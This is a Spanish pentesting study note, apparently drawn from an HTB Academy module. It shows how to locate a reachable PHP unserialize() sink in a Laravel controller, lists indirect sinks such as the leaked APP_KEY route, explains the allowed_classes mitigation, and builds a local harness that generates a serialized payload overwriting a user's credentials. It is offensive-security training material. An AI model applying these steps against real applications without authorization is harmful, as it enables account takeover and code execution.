---
tags:
  - Web/Red-Team
  - Deserializacion
  - Whitebox
  - Pentesting/Explotacion
Descripción: "Cómo localizar un unserialize() alcanzable en una base de código PHP y montar el arnés local que permite iterar el payload sin tocar el objetivo"
Fecha de actualización: 2026-11-20
Nota previa: "[[02 - Identificar datos serializados y sus sinks]]"
Nota siguiente: "[[04 - Object injection en PHP]]"
Area: "[[Deserialización.base|Deserialización]]"
---
---

Encontrar la cadena serializada en una petición es el primer paso, no el hallazgo. Lo que convierte eso en una vulnerabilidad es que exista un **`sink` alcanzable** y que nada firme ni valide el dato por el camino. En whitebox esa comprobación se hace leyendo; en blackbox se infiere. Esta nota recorre el camino completo sobre el escenario del módulo —una aplicación Laravel con una función de exportar/importar ajustes— y añade la parte que HTB no desarrolla: **cómo se monta el laboratorio local y por qué no es opcional**.

# Localizar el sink

El `grep` directo por el nombre de la función es el reflejo correcto, pero rinde poco solo: en un proyecto con `vendor/` hay cientos de coincidencias irrelevantes.

```shell-session
$ grep -rn --include='*.php' 'unserialize(' app/ routes/ config/
app/Http/Controllers/HTController.php:131:  $userSettings = unserialize(base64_decode($request['settings']));
```

<mark style="background: #FF5582A6;">Excluir `vendor/` del primer barrido y volver a entrar en él solo cuando haya que construir la cadena de `gadgets`</mark>. El código propio es donde está el `sink`; el de terceros es donde están los `gadgets`.

La vía complementaria, más rápida cuando la aplicación es grande, es **buscar por el efecto en vez de por la causa**: localizar la cadena de texto que la interfaz devuelve y tirar del hilo hacia atrás.

```shell-session
$ grep -rn 'Exported user settings!' .
./app/Http/Controllers/HTController.php:123:  Session::flash('ie-message', 'Exported user settings!');
```

Ese es el patrón general de la revisión de código dirigida por la funcionalidad: se parte de lo observable en la aplicación —un mensaje, un nombre de campo, una cookie— y se navega al controlador. Está desarrollado en [[02 - Code review - alcance, priorización y lectura]].

El código que aparece es el caso de libro:

```php
else if (isset($request['import']) && !empty($request['settings'])) {
    $userSettings = unserialize(base64_decode($request['settings']));
    $user = Auth::user();
    $user->name     = $userSettings->getName();
    $user->email    = $userSettings->getEmail();
    $user->password = $userSettings->getPassword();
    $user->save();
}
```

Tres propiedades lo hacen explotable, y conviene verificarlas una a una porque son la lista de comprobación reutilizable:

1. **El dato es del usuario.** Llega en un parámetro de la petición; `base64_decode` es codificación, no protección.
2. **No hay integridad.** No hay HMAC, ni firma, ni cifrado autenticado. Nada ata ese blob a haber salido del servidor.
3. **No hay restricción de clases.** `unserialize()` se llama sin su segundo argumento, así que reconstruye **cualquier clase cargable** del proyecto y de sus dependencias, no solo `UserSettings`.

<mark style="background: #8000E1A6;">El tercer punto es el que amplía el impacto de «manipular mis propios ajustes» a «ejecutar código»</mark>: el tipo de objeto que llega no está acotado, de modo que el atacante elige con qué clase trabajar entre todas las del `autoload`.

> [!important]+ `allowed_classes`, el argumento que casi nadie pone
> `unserialize()` acepta un segundo parámetro con la opción `allowed_classes` (el changelog de php.net lo documenta desde **PHP 7.1.0**): `unserialize($data, ['allowed_classes' => false])` degrada cualquier objeto a `__PHP_Incomplete_Class` y `['allowed_classes' => ['UserSettings']]` permite solo esa. El módulo no lo menciona, y es la mitigación de una línea que habría cerrado este capítulo. Dos límites que el nombre no deja ver (verificados en `var_unserializer.re` de php-src): <mark style="background: #FFB8EBA6;">el match es **exacto** —no cubre subclases ni interfaces, permitir `Foo` no permite `Bar extends Foo`— y no protege de las clases que **sí** permites</mark> (si una de ellas tiene un `__wakeup`/`__destruct` con efectos, sigues expuesto). La allowlist reduce la superficie, no la elimina. Detalle en [[13 - Defensa - formatos seguros y restricción de clases]].

## Sinks de PHP que no se llaman `unserialize`

Buscar solo `unserialize(` deja fuera la mitad de los casos reales. Son `sinks` igualmente:

| Vía | Mecanismo |
| --- | --- |
| Wrapper `phar://` | Cualquier operación de ficheros sobre un `.phar` deserializa sus metadatos en PHP < 8.0 — ver [[06 - Deserialización PHAR - sinks que no parecen sinks]] |
| `session_decode` / handler de sesión | El contenido de `$_SESSION` se deserializa al arrancar la sesión; si el almacén es escribible, es un `sink` |
| `Laravel: decrypt()` | `Illuminate\Encryption\Encrypter::decrypt()` deserializa por defecto tras descifrar. Con el `APP_KEY` filtrado, cualquier cookie o campo cifrado se convierte en un `sink` de RCE |
| Colas y `jobs` | Un `job` de Laravel, Symfony Messenger o similar viaja serializado; si el `broker` es alcanzable, se inyecta ahí |
| `yaml_parse` (ext-yaml) | Con `yaml.decode_php` activado instancia objetos PHP |
| Caché | Redis o Memcached sin autenticación: se escribe la entrada serializada y la aplicación la reconstruye |

<mark style="background: #FFB8EBA6;">La variante del `APP_KEY` de Laravel es hoy la más rentable de la lista en bug bounty</mark>, porque esa clave se filtra con frecuencia en repositorios, ficheros `.env` expuestos y `backups`, y el camino de clave filtrada a RCE es mecánico.

# El arnés local

Con el `sink` identificado, el impulso es generar el `payload` y lanzarlo. Es el error. <mark style="background: #FFB86CA6;">Cada disparo contra el objetivo deja una entrada en los logs, puede dejar el estado de la aplicación inconsistente y, si hay WAF, consume el margen antes del bloqueo</mark>. Con el código delante no hace falta: se reproduce el `sink` en local y se itera ahí.

La técnica es **aislar la función objetivo**, no desplegar la aplicación. Montar Laravel con su MySQL para probar una llamada a `unserialize` es desproporcionado; basta con copiar la clase y recrear el fragmento del controlador.

Primero la clase, tal cual está en el proyecto, respetando `namespace` y visibilidad —el `mangling` de propiedades privadas depende del nombre exacto de la clase, como se vio en [[00 - Serialización y deserialización - el formato por dentro]]:

```php
<?php
namespace App\Helpers;

class UserSettings {
    private $Name;
    private $Email;
    private $Password;
    private $ProfilePic;

    public function getName() { return $this->Name; }
    public function getEmail() { return $this->Email; }
    // ... resto de getters y setters

    public function __construct($Name, $Email, $Password, $ProfilePic) {
        $this->setName($Name);
        $this->setEmail($Email);
        $this->setPassword($Password);
        $this->setProfilePic($ProfilePic);
    }
}
```

El generador de `payload`:

```php
<?php
include('UserSettings.php');

echo base64_encode(serialize(
    new \App\Helpers\UserSettings('pentest', 'attacker@htbank.com', '$2y$10$...', 'default.jpg')
));
```

Y el arnés que imita el `sink` recibiendo el `payload` por argumento, con las líneas del controlador original comentadas al lado para que se vea la correspondencia:

```php
<?php
include('UserSettings.php');

// $userSettings = unserialize(base64_decode($request['settings']));
$userSettings = unserialize(base64_decode($argv[1]));

// $user->name  = $userSettings->getName();
printf("name       = %s\n", $userSettings->getName());
printf("email      = %s\n", $userSettings->getEmail());
printf("password   = %s\n", $userSettings->getPassword());
printf("profilePic = %s\n", $userSettings->getProfilePic());
```

```shell-session
$ php exploit.php > payload.b64
$ php target.php "$(cat payload.b64)"
name       = pentest
email      = attacker@htbank.com
password   = $2y$10$...
profilePic = default.jpg
```

Lo que compra este montaje, en orden de importancia:

- **Ver el error de verdad.** En el objetivo un `payload` mal formado devuelve un 500 genérico o un redirect; en local se lee la excepción con su traza y se corrige en segundos.
- **Distinguir «no funcionó» de «no llegó».** Si el objeto se reconstruye bien en local y en remoto no pasa nada, el problema está en el transporte —codificación, límite de longitud, WAF—, no en el `payload`.
- **Trabajar sobre la versión correcta.** El comportamiento de `unserialize` y de los `magic methods` cambia entre ramas de PHP. Reproducir con la misma versión mayor que el objetivo evita conclusiones falsas; `docker run --rm -it php:8.3-cli php -a` cuesta un comando.
- **No contaminar el informe.** Las peticiones que acaben en el log del cliente son las que de verdad demuestran el hallazgo, no las cincuenta de depuración.

> [!warning]+ El arnés también engaña si se construye mal
> Copiar la clase **sin** los `magic methods` que trae el original produce un arnés que deserializa limpiamente mientras el objetivo ejecuta código. Al contrario, dejar en el arnés un `__wakeup` con un `shell_exec` real ejecuta el comando en la propia máquina del pentester. Durante la fase de pruebas conviene sustituir la ejecución por un `print` del comando construido, para leer exactamente qué le llegaría a la `shell` — es la técnica que se usa en [[05 - Magic methods de PHP y la ruta a RCE]].

Con el arnés en pie, el siguiente paso es decidir qué se falsifica. Lo más barato es manipular las propiedades del objeto legítimo; lo más potente, encadenar clases ajenas.

> [!info]+ Fuentes
> Firma y opciones de `unserialize()`: [php.net/manual/en/function.unserialize.php](https://www.php.net/manual/en/function.unserialize.php). Comportamiento de `Encrypter::decrypt()` en Laravel: [documentación de cifrado de Laravel](https://laravel.com/docs/encryption). Escenario de partida: módulo *Introduction to Deserialization Attacks* de HTB Academy, reorganizado y ampliado con los `sinks` indirectos y la metodología de arnés local.
